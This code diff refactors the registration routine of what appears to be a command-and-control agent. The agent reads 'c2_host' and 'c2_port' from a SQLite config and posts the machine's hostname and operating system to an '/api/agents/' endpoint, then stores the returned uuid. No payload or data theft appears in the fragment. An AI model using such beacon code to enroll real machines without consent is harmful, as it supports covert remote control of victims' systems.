@@ -4,28 +4,33 @@ from sys import platform
 
 from .settings import *
 from .decorators import Request
-from .pycle import *
 
-fetch = Request('127.0.0.1', port=8000)
-state = State(state_file)
+from .db.SQLite import Helper
 
 
-def register():
-    data = {
-        "name" : gethostname(),
-        "os" : platform,
-    }
+class ApiHelper(object):
+    def __init__(self):
+        self.db = Helper()
+        self.fetch = Request(self.db.get_config('c2_host'), int(self.db.get_config('c2_port')))
 
-    uuid = state.get_field('uuid')
-    if uuid:
-        data['uuid'] = uuid
-        
-    @fetch('/api/agents/', proto="POST", data=data)
-    def handle(resp):
-        print data
-        print resp
-        resp_json = json.loads(resp)
-        data['uuid'] = resp_json['uuid']
-        state.update(data)
-        print state.dump()
-    handle()
+
+
+
+    def register(self):
+        data = {
+            "name": gethostname(),
+            "os": platform,
+        }
+
+        uuid = self.db.get_config('uuid')
+        if uuid:
+            data['uuid'] = uuid
+
+        @self.fetch('/api/agents/', proto="POST", data=data)
+        def handle(resp):
+            print data
+            print resp
+            resp_json = json.loads(resp)
+            self.db.set_config('uuid', resp_json['uuid'])
+
+        handle()
